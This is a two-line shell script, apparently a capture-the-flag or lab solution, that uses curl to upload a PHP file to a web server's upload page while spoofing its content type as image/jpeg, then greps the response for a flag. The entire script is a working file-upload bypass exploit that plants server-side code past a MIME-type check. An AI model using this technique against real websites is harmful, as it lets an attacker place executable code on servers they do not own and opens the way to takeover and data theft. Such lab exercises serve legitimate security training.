#!/bin/sh

curl -X POST -F "uploaded=@./file.php;type=image/jpeg" http://10.13.100.223/\?page\=upload -F "Upload=Upload" | grep flag